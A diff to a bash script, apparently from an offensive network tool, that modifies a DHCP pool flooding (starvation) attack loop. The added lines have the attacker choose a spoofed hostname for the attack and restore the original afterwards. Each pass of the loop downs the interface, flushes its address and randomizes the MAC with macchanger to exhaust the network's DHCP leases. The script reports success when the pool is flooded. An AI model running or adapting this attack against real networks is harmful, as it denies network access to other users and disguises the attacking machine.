@@ -184,9 +184,13 @@ if [ $ask -eq 5 ]
 		tput setaf 1
 		gate=$(/sbin/ip route | awk '/default/ { print $3 }')
 		#start dhcp pool flooding
+		resethost=$(hostname)
+		echo "Hostname to use during attack?:"
+		read hostatt
 		while [ $online -eq 1 ]
 			do
 				echo "attack is running, this will take a while.."
+				sudo hostname $hostatt
 				sudo ifconfig $inter down && sleep 2
 				sudo ip addr flush dev $inter
 				sudo macchanger -a $inter
@@ -207,6 +211,7 @@ if [ $ask -eq 5 ]
 				#check online end
 		done
 		#end dhcp pool flooding
+		sudo hostname $resethost
 		echo "	"
 		echo "The connection is interrupted!"
 		echo "You may be out of reach or DHCP pool has been successfully flooded" 
